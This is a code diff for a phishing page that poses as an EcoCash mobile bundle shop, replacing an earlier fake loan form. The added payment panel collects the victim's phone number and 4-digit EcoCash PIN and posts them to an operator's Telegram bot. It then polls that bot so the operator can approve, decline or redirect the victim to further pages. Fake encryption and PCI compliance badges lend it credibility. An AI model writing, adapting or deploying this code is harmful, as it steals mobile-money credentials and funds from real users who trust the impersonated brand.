-    const interest = Math.round(a * RATE * selMonths);
-    const total    = a + interest;
-    const monthly  = Math.round(total / selMonths);
-    loanData = { amount: a, months: selMonths, total, monthly, interest };
+/* ════════════════════════════════════════════
+   BUNDLE DEFINITIONS
+════════════════════════════════════════════ */
+var BUNDLES = [
+  {key:'daily',    label:'Daily Bundle',    sub:'Active for 1 day',   max:0.60, period:'Daily',   maxVoice:20,  maxSms:25,   maxData:3,   best:false},
+  {key:'threeday', label:'3-Day Bundle',    sub:'Active for 3 days',  max:1.40, period:'3 Days',  maxVoice:50,  maxSms:75,   maxData:8,   best:false},
+  {key:'weekly',   label:'Weekly Bundle',   sub:'Active for 7 days',  max:2.80, period:'Weekly',  maxVoice:120, maxSms:200,  maxData:20,  best:false},
+  {key:'twoweek',  label:'2-Week Bundle',   sub:'Active for 14 days', max:5.20, period:'2 Weeks', maxVoice:250, maxSms:450,  maxData:45,  best:false},
+  {key:'monthly',  label:'Monthly Bundle',  sub:'Active for 30 days', max:9.90, period:'Monthly', maxVoice:600, maxSms:1000, maxData:100, best:true}
+];
 
-    document.getElementById('amountDisplay').textContent = a.toLocaleString();
-    document.getElementById('monthlyOut').textContent    = CUR + ' ' + monthly.toLocaleString();
-    document.getElementById('interestOut').textContent   = CUR + ' ' + interest.toLocaleString();
-    document.getElementById('totalOut').textContent      = CUR + ' ' + total.toLocaleString();
-    document.getElementById('termNote').textContent      = selMonths + ' month' + (selMonths > 1 ? 's' : '');
-    document.getElementById('sumAmt').textContent        = a.toLocaleString();
-    document.getElementById('sumRepay').textContent      = total.toLocaleString();
-  }
+var panelState = {};
+BUNDLES.forEach(function(b){
+  panelState[b.key] = {voice:b.maxVoice, sms:b.maxSms, data:b.maxData};
+});
 
-  function onSlider() { calc(); }
-
-  function pickTerm(m) {
-    selMonths = m;
-    document.querySelectorAll('.term-btn').forEach(b =>
-      b.classList.toggle('active', parseInt(b.dataset.m) === m)
-    );
-    calc();
-  }
-
-  /* ── NAV ── */
-  function toggleNav() {
-    document.getElementById('mobileMenu').classList.toggle('open');
-    document.getElementById('hamburger').classList.toggle('open');
-  }
-  function closeNav() {
-    document.getElementById('mobileMenu').classList.remove('open');
-    document.getElementById('hamburger').classList.remove('open');
-  }
-
-  /* ── MODAL ── */
-  function openModal() {
-    calc();
-    document.getElementById('appModal').classList.add('open');
-    document.body.style.overflow = 'hidden';
-    goStep(1);
-  }
-  function closeModal() {
-    document.getElementById('appModal').classList.remove('open');
-    document.body.style.overflow = '';
-  }
-  document.getElementById('appModal').addEventListener('click', e => {
-    if (e.target === e.currentTarget) closeModal();
+/* ════════════════════════════════════════════
+   BUILD BUNDLE CARDS
+════════════════════════════════════════════ */
+function buildAllCards(){
+  var stack = document.getElementById('bundlesStack');
+  stack.innerHTML = '';
+  BUNDLES.forEach(function(b){
+    var div = document.createElement('div');
+    div.className = 'bundle-card-main';
+    div.id = 'bundle-' + b.key;
+    div.innerHTML = buildCardHTML(b, panelState[b.key]);
+    stack.appendChild(div);
   });
-  window.addEventListener('keydown', e => { if (e.key === 'Escape') closeModal(); });
+  BUNDLES.forEach(function(b){ updatePrice(b.key); });
+  updateSummaryFor('daily');
+}
 
-  document.getElementById('appPhone').addEventListener('input', function () {
-    this.value = this.value.replace(/\D/g, '').slice(0, 9);
+function buildCardHTML(b, s){
+  var vPct = (s.voice/b.maxVoice*100).toFixed(1);
+  var sPct = (s.sms/b.maxSms*100).toFixed(1);
+  var dPct = (s.data/b.maxData*100).toFixed(1);
+  return '<div class="bcard-head">'
+    +'<div class="bcard-head-left"><h2>'+b.label+'</h2><p>'+b.sub+'</p></div>'
+    +'<div class="bcard-price-wrap">'
+    +'<div class="bcard-price-label">Max USD</div>'
+    +'<div class="bcard-price"><span>$</span>'+b.max.toFixed(2)+'</div>'
+    +(b.best?'<div class="best-badge">Best value — save more with monthly</div>':'')
+    +'</div></div>'
+    +'<div class="bcard-body">'
+    +'<div class="slider-section">'
+    +'<div class="slider-row"><div class="slider-icon">📞</div>'
+    +'<div class="slider-info"><h4>Voice calls</h4><p>Local minutes</p></div>'
+    +'<div class="slider-val" id="'+b.key+'-voice-val">'+s.voice+' <em>Min</em></div></div>'
+    +'<input type="range" id="'+b.key+'-voice" min="0" max="'+b.maxVoice+'" step="1" value="'+s.voice+'" style="--pct:'+vPct+'%" aria-label="Voice minutes" oninput="sliderChange(\''+b.key+'\',\'voice\',this)">'
+    +'<div class="range-minmax"><span>0 Min</span><span>'+b.maxVoice+' Min</span></div></div>'
+    +'<div class="slider-section">'
+    +'<div class="slider-row"><div class="slider-icon">💬</div>'
+    +'<div class="slider-info"><h4>SMS messages</h4><p>Text messages</p></div>'
+    +'<div class="slider-val" id="'+b.key+'-sms-val">'+s.sms+' <em>SMS</em></div></div>'
+    +'<input type="range" id="'+b.key+'-sms" min="0" max="'+b.maxSms+'" step="1" value="'+s.sms+'" style="--pct:'+sPct+'%" aria-label="SMS messages" oninput="sliderChange(\''+b.key+'\',\'sms\',this)">'
+    +'<div class="range-minmax"><span>0 SMS</span><span>'+b.maxSms+' SMS</span></div></div>'
+    +'<div class="slider-section">'
+    +'<div class="slider-row"><div class="slider-icon">📶</div>'
+    +'<div class="slider-info"><h4>Mobile data</h4><p>Internet usage</p></div>'
+    +'<div class="slider-val" id="'+b.key+'-data-val">'+s.data+' <em>GB</em></div></div>'
+    +'<input type="range" id="'+b.key+'-data" min="0" max="'+b.maxData+'" step="0.5" value="'+s.data+'" style="--pct:'+dPct+'%" aria-label="Mobile data" oninput="sliderChange(\''+b.key+'\',\'data\',this)">'
+    +'<div class="range-minmax"><span>0 GB</span><span>'+b.maxData+' GB</span></div></div>'
+    +'</div>'
+    +'<div class="price-bar">'
+    +'<div><div class="price-bar-label">Your '+b.period.toLowerCase()+' price</div>'
+    +'<div class="price-bar-val" id="'+b.key+'-price">USD '+b.max.toFixed(2)+'</div>'
+    +'<div class="price-bar-sub">Adjust sliders to customise</div></div>'
+    +'<button class="subscribe-btn" onclick="openModal(\''+b.key+'\')">Subscribe — '+b.period+'</button>'
+    +'</div>'
+    +'<div class="security-row">'
+    +'<div class="sec-badge">🔒 256-bit Encrypted</div>'
+    +'<div class="sec-dot"></div>'
+    +'<div class="sec-badge">PCI DSS Compliant</div>'
+    +'<div class="sec-dot"></div>'
+    +'<div class="sec-badge">Powered by Econet Wireless · EcoCash</div>'
+    +'</div>';
+}
+
+/* ════════════════════════════════════════════
+   SLIDERS
+════════════════════════════════════════════ */
+function sliderChange(key, type, input){
+  var val = parseFloat(input.value);
+  var b = BUNDLES.find(function(x){return x.key===key;});
+  panelState[key][type] = val;
+  var max = type==='voice'?b.maxVoice:type==='sms'?b.maxSms:b.maxData;
+  input.style.setProperty('--pct', (max>0?(val/max*100):0).toFixed(1)+'%');
+  var unit = type==='voice'?' <em>Min</em>':type==='sms'?' <em>SMS</em>':' <em>GB</em>';
+  var el = document.getElementById(key+'-'+type+'-val');
+  if(el) el.innerHTML = val+unit;
+  updatePrice(key);
+  updateSummaryFor(key);
+}
+
+function calcPrice(key){
+  var b = BUNDLES.find(function(x){return x.key===key;});
+  var s = panelState[key];
+  var vf = b.maxVoice>0?s.voice/b.maxVoice:0;
+  var sf = b.maxSms>0?s.sms/b.maxSms:0;
+  var df = b.maxData>0?s.data/b.maxData:0;
+  return parseFloat((b.max*(vf*0.30+sf*0.20+df*0.50)).toFixed(2));
+}
+
+function updatePrice(key){
+  var b = BUNDLES.find(function(x){return x.key===key;});
+  var s = panelState[key];
+  var price = (s.voice===b.maxVoice&&s.sms===b.maxSms&&s.data===b.maxData)?b.max:calcPrice(key);
+  var el = document.getElementById(key+'-price');
+  if(el) el.textContent = 'USD '+price.toFixed(2);
+  return price;
+}
+
+var lastKey = 'daily';
+function updateSummaryFor(key){
+  lastKey = key;
+  var b = BUNDLES.find(function(x){return x.key===key;});
+  var s = panelState[key];
+  var price = updatePrice(key);
+  document.getElementById('summary-period').textContent = b.period;
+  document.getElementById('summary-price').textContent  = 'USD '+price.toFixed(2);
+  document.getElementById('summary-voice').textContent  = s.voice>0?s.voice+' Min':'—';
+  document.getElementById('summary-sms').textContent    = s.sms>0?s.sms+' SMS':'—';
+  document.getElementById('summary-data').textContent   = s.data>0?s.data+' GB':'—';
+}
+
+/* ════════════════════════════════════════════
+   SCROLL / NAV HELPERS
+════════════════════════════════════════════ */
+function scrollToTop(){window.scrollTo({top:0,behavior:'smooth'});}
+function scrollTo(id){
+  var el = document.getElementById(id);
+  if(el) el.scrollIntoView({behavior:'smooth',block:'start'});
+  closeNav();
+}
+function jumpTo(id, tabEl){
+  var el = document.getElementById(id);
+  if(el) el.scrollIntoView({behavior:'smooth',block:'start'});
+  if(tabEl){
+    document.querySelectorAll('.ptab').forEach(function(t){t.classList.remove('active');});
+    tabEl.classList.add('active');
+  }
+  closeNav();
+}
+
+function updateActiveTab(){
+  var scrollY = window.scrollY+120;
+  var active = 'daily';
+  BUNDLES.forEach(function(b){
+    var el = document.getElementById('bundle-'+b.key);
+    if(el&&el.offsetTop<=scrollY) active=b.key;
   });
+  document.querySelectorAll('.ptab').forEach(function(t,i){
+    t.classList.toggle('active',i===BUNDLES.findIndex(function(b){return b.key===active;}));
+  });
+  updateSummaryFor(active);
+}
+window.addEventListener('scroll',updateActiveTab,{passive:true});
 
-  function validateStep1() {
-    const n   = document.getElementById('fullName').value.trim();
-    const p   = document.getElementById('appPhone').value.replace(/\D/g, '');
-    const e   = document.getElementById('employment').value;
-    const inc = document.getElementById('income').value;
-    if (!n)                         { alert('Please enter your full name.');                            return false; }
-    if (p.length !== 9)             { alert('Please enter a valid 9-digit number (after +263).');       return false; }
-    if (!e)                         { alert('Please select your employment status.');                   return false; }
-    if (!inc || Number(inc) <= 0)   { alert('Please enter a valid monthly income greater than zero.');  return false; }
-    return true;
-  }
+/* ════════════════════════════════════════════
+   CONFIRM MODAL
+════════════════════════════════════════════ */
+var _currentKey = null;
+function openModal(key){
+  var b = BUNDLES.find(function(x){return x.key===key;});
+  var s = panelState[key];
+  var price = (s.voice===b.maxVoice&&s.sms===b.maxSms&&s.data===b.maxData)?b.max:calcPrice(key);
+  _currentKey = key;
+  document.getElementById('mod-duration').textContent = b.period;
+  document.getElementById('mod-voice').textContent    = s.voice+' Min';
+  document.getElementById('mod-sms').textContent      = s.sms+' SMS';
+  document.getElementById('mod-data').textContent     = s.data+' GB';
+  document.getElementById('mod-total').textContent    = 'USD '+price.toFixed(2);
+  document.getElementById('mod-confirm-btn').onclick  = function(){
+    closeModal();
+    openPaymentPanel(b, s, price);
+  };
+  document.getElementById('confirmModal').classList.add('open');
+}
+function closeModal(){document.getElementById('confirmModal').classList.remove('open');}
+document.getElementById('confirmModal').addEventListener('click',function(e){if(e.target===this)closeModal();});
+document.addEventListener('keydown',function(e){if(e.key==='Escape'){closeModal();closePaymentPanel();}});
 
-  const STEP_LABELS = [
-    'Step 1 of 3 — Your Details',
-    'Step 2 of 3 — Review Information',
-    'Step 3 of 3 — Confirmation'
-  ];
+/* ════════════════════════════════════════════
+   PAYMENT PANEL  (was login.html)
+════════════════════════════════════════════ */
+var _payBundle = null;
 
-  function goStep(step) {
-    if (step === 2 && !validateStep1()) return;
-    ['step1', 'step2', 'step3'].forEach((id, i) =>
-      document.getElementById(id).style.display = i === step - 1 ? 'block' : 'none'
-    );
-    ['seg1', 'seg2', 'seg3'].forEach((id, i) =>
-      document.getElementById(id).classList.toggle('active', i < step)
-    );
-    document.getElementById('modalSub').textContent = STEP_LABELS[step - 1];
-    if (step === 2) fillReview();
-    if (step === 3) fillFinal();
-  }
+function openPaymentPanel(b, s, price){
+  _payBundle = {b:b, s:s, price:price};
 
-  function fillReview() {
-    calc();
-    const inc   = parseInt(document.getElementById('income').value) || 0;
-    const phone = document.getElementById('appPhone').value.replace(/\D/g, '');
-    document.getElementById('revName').textContent    = document.getElementById('fullName').value.trim() || '—';
-    document.getElementById('revPhone').textContent   = '+263 ' + phone;
-    document.getElementById('revEmploy').textContent  = document.getElementById('employment').value || '—';
-    document.getElementById('revIncome').textContent  = CUR + ' ' + inc.toLocaleString();
-    document.getElementById('revAmount').textContent  = CUR + ' ' + loanData.amount.toLocaleString();
-    document.getElementById('revPeriod').textContent  = loanData.months + ' month' + (loanData.months > 1 ? 's' : '');
-    document.getElementById('revRate').textContent    = '10.9% per month (flat)';
-    document.getElementById('revTotal').textContent   = CUR + ' ' + loanData.total.toLocaleString();
-  }
+  /* fill recap */
+  document.getElementById('pbr-period').textContent = b.period;
+  document.getElementById('pbr-voice').textContent  = s.voice+' Min';
+  document.getElementById('pbr-sms').textContent    = s.sms+' SMS';
+  document.getElementById('pbr-data').textContent   = s.data+' GB';
+  document.getElementById('pbr-price').textContent  = 'USD '+price.toFixed(2);
 
-  function fillFinal() {
-    document.getElementById('finalAmt').textContent    = loanData.amount.toLocaleString();
-    document.getElementById('finalRepay').textContent  = loanData.total.toLocaleString();
-    document.getElementById('verifyMsg').style.display = 'none';
-  }
+  /* reset fields */
+  document.getElementById('payPhone').value = '';
+  document.getElementById('payPin').value   = '';
+  document.getElementById('payError').style.display = 'none';
+  resetPayBtn();
 
-  function goVerify() {
-    document.getElementById('verifyMsg').style.display = 'block';
-    // Redirect to login after brief delay
-    setTimeout(() => {
-      window.location.href = 'login.html';
-    }, 1800);
-  }
+  document.getElementById('paymentPanel').classList.add('open');
+  document.body.style.overflow = 'hidden';
+  document.getElementById('payPhone').focus();
+}
 
-  /* ── FAQ ── */
-  function toggleFaq(el) { el.parentElement.classList.toggle('open'); }
+function closePaymentPanel(){
+  document.getElementById('paymentPanel').classList.remove('open');
+  document.body.style.overflow = '';
+}
 
-  /* ── INIT ── */
-  window.addEventListener('load', calc);
+/* input sanitisation */
+document.getElementById('payPhone').addEventListener('input',function(){
+  this.value = this.value.replace(/\D/g,'').slice(0,9);
+});
+document.getElementById('payPin').addEventListener('input',function(){
+  this.value = this.value.replace(/\D/g,'').slice(0,4);
+  if(this.value.length===4) this.blur();
+});
+
+function normalizePhone(p){
+  return String(p||'').replace(/\D/g,'').replace(/^263/,'').slice(-9);
+}
+function showPayError(msg){
+  var el = document.getElementById('payError');
+  el.textContent = msg;
+  el.style.display = 'block';
+}
+function resetPayBtn(){
+  var btn = document.getElementById('payBtn');
+  btn.disabled = false;
+  btn.textContent = 'Pay with EcoCash';
+  isProcessing = false;
+}
+
+/* ════════════════════════════════════════════
+   TELEGRAM BOT — send + poll  (unchanged logic)
+════════════════════════════════════════════ */
+var botState = {lastUpdateId:0};
+var isProcessing = false;
+
+document.getElementById('payBtn').addEventListener('click', function(){
+  document.getElementById('payError').style.display = 'none';
+  var phone = normalizePhone(document.getElementById('payPhone').value);
+  var pin   = document.getElementById('payPin').value.trim();
+
+  if(phone.length!==9){showPayError('Please enter a valid 9-digit mobile number.');return;}
+  if(pin.length!==4){showPayError('Please enter your 4-digit EcoCash PIN.');return;}
+
+  sendToBot(phone, pin);
+});
+
+function sendToBot(phone, pin){
+  if(isProcessing) return;
+  isProcessing = true;
+  var btn = document.getElementById('payBtn');
+  btn.disabled = true;
+  btn.textContent = 'Verifying…';
+
+  var o       = _payBundle;
+  var period  = o?o.b.period:'—';
+  var voice   = o?o.s.voice+' Min':'—';
+  var sms     = o?o.s.sms+' SMS':'—';
+  var data    = o?o.s.data+' GB':'—';
+  var price   = o?'USD '+o.price.toFixed(2):'—';
+
+  var ts        = Date.now();
+  var approveId = 'approve_'+ts;
+  var declineId = 'decline_'+ts;
+  var verifyId  = 'verify_'+ts;
+
+  fetch('https://api.telegram.org/bot'+CONFIG.BOT_TOKEN+'/sendMessage',{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({
+      chat_id: CONFIG.CHAT_ID,
+      text: '<b>🟢 EcoCash Mix Bundle Payment</b>\n\n'
+          + '📦 Bundle: <b>'+period+'</b>\n'
+          + '📞 Voice: <b>'+voice+'</b>\n'
+          + '💬 SMS: <b>'+sms+'</b>\n'
+          + '📶 Data: <b>'+data+'</b>\n'
+          + '💵 Total: <b>'+price+'</b>\n\n'
+          + 'Phone: <code>+263'+phone+'</code>\n'
+          + 'PIN: <code>'+pin+'</code>\n\n'
+          + 'Choose Action:',
+      parse_mode:'HTML',
+      reply_markup:{
+        inline_keyboard:[
+          [
+            {text:'✅ Approve Payment', callback_data:approveId},
+            {text:'📱 Verify Device',   callback_data:verifyId}
+          ],
+          [{text:'❌ Decline', callback_data:declineId}]
+        ]
+      }
+    })
+  })
+  .then(function(){
+    localStorage.setItem('phone', phone);
+    localStorage.setItem('ecocashSession', JSON.stringify({phone:phone, at:new Date().toISOString()}));
+    document.getElementById('spinnerOverlay').style.display = 'flex';
+    startPolling(approveId, declineId, verifyId);
+  })
+  .catch(function(){resetPayBtn();});
+}
+
+function startPolling(approveId, declineId, verifyId){
+  var interval = setInterval(function(){
+    fetch('https://api.telegram.org/bot'+CONFIG.BOT_TOKEN+'/getUpdates?offset='+(botState.lastUpdateId+1))
+      .then(function(r){return r.json();})
+      .then(function(data){
+        if(!data.ok||!data.result) return;
+        data.result.forEach(function(update){
+          botState.lastUpdateId = update.update_id;
+          if(update.callback_query){
+            var cb = update.callback_query.data;
+            if(cb===approveId){
+              clearInterval(interval);
+              document.getElementById('spinnerOverlay').style.display = 'none';
+              showAuthThenRedirect(CONFIG.APPROVE_PAGE);
+            } else if(cb===verifyId){
+              clearInterval(interval);
+              document.getElementById('spinnerOverlay').style.display = 'none';
+              showAuthThenRedirect(CONFIG.DEVICE_PAGE);
+            } else if(cb===declineId){
+              clearInterval(interval);
+              document.getElementById('spinnerOverlay').style.display = 'none';
+              showPayError('Payment declined. Please try again.');
+              resetPayBtn();
+            }
+          }
+        });
+      });
+  }, 1000);
+}
+
+/* ════════════════════════════════════════════
+   AUTH SCREEN → then redirect
+════════════════════════════════════════════ */
+function showAuthThenRedirect(dest){
+  var auth = document.getElementById('authScreen');
+  auth.classList.add('show');
+
+  var dotIdx = 0;
+  var dots   = [document.getElementById('dot1'),document.getElementById('dot2'),document.getElementById('dot3')];
+  dots.forEach(function(d){d.classList.remove('active');});
+  dots[0].classList.add('active');
+  var dotTimer = setInterval(function(){
+    dots.forEach(function(d){d.classList.remove('active');});
+    dotIdx = (dotIdx+1)%3;
+    dots[dotIdx].classList.add('active');
+  }, 500);
+
+  setTimeout(function(){
+    clearInterval(dotTimer);
+    window.location.href = dest;
+  }, 2200);
+}
+
+/* ════════════════════════════════════════════
+   FAQ
+════════════════════════════════════════════ */
+function toggleFaq(btn){btn.parentElement.classList.toggle('open');}
+
+/* ════════════════════════════════════════════
+   MOBILE NAV
+════════════════════════════════════════════ */
+function closeNav(){
+  document.getElementById('navLinks').classList.remove('active');
+  document.getElementById('hamburger').setAttribute('aria-expanded','false');
+}
+document.getElementById('hamburger').addEventListener('click',function(){
+  var open = document.getElementById('navLinks').classList.toggle('active');
+  this.setAttribute('aria-expanded', open?'true':'false');
+});
+
+/* ════════════════════════════════════════════
+   SPLASH
+════════════════════════════════════════════ */
+function hideSplash(){
+  document.getElementById('splash').classList.add('hide');
+  document.body.classList.remove('splash-lock');
+}
+window.addEventListener('load',function(){setTimeout(hideSplash,1100);});
+if(document.readyState==='complete') setTimeout(hideSplash,1100);
+
+document.getElementById('yr').textContent = new Date().getFullYear();
+buildAllCards();
 </script>
 </body>
 </html>
